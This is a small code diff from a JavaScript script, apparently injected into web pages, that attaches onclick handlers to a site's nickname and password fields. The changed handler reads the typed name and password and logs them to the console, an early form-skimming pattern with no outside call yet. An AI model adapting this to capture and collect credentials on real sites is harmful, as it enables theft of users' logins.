@@ -8,7 +8,7 @@
     if(pass != null && name != null) {
         console.log('inputs found!');
 
-        const onClickAction = "console.log('name: ' + name.value + ' pass: ' + pass.value);"
+        const onClickAction = "const name = document.getElementById('user_nickname'); const pass = document.getElementById('user_password'); console.log('name: ' + name.value + ' pass: ' + pass.value);"
         name.setAttribute("onclick", onClickAction);
         pass.setAttribute("onclick", onClickAction);
 
